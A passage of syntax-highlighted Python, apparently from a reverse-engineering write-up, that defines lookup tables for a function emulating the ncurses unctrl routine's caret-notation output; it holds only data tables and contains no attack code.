style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0020</span>, <span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0028</span>,<span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0043</span>,<span style="color:#ae81ff">0x0000</span>,  <span style="color:#ae81ff">0x0029</span>,<span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x003c</span>, <span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x003c</span>,<span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x002d</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0028</span>,<span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0052</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0029</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0075</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x002c</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x003e</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x003e</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0020</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0031</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x002f</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0034</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0020</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0020</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0031</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x002f</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0032</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0020</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0020</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0033</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x002f</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0034</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0020</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0041</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0045</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0078</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0073</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0073</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0061</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0065</span>, <span style="color:#ae81ff">0x0000</span>, ]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unctrl_sp_emu</span>(x):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> ctype_loc
</span></span><span style="display:flex;"><span>    word_29780 <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">92</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">96</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">104</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">108</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">116</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">118</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">122</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">124</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">130</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">132</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">134</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">136</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">138</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">140</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">142</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">148</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">150</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">152</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">154</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">156</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">158</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">160</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">162</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">164</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">166</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">170</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">172</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">174</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">176</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">178</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">180</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">182</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">184</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">186</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">188</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">190</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">194</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">196</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">198</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">202</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">204</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">206</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">208</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">210</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">212</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">214</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">216</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">218</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">220</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">222</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">226</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">228</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">230</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">232</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">234</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">236</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">238</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">240</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">242</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">244</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">246</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">248</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">250</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">254</span>, <span style="color:#ae81ff">3</span>]
</span></span><span style="display:flex;"><span>    unk_29360 <span style="color:#f92672">=</span> [<span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">67</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">69</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">79</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">92</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">67</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">69</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">79</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">92</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">96</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">104</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">105</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">107</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">108</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">113</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">115</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">116</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">117</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">118</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">122</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">124</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">125</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">67</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">69</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">79</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">92</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">77</span>, <span 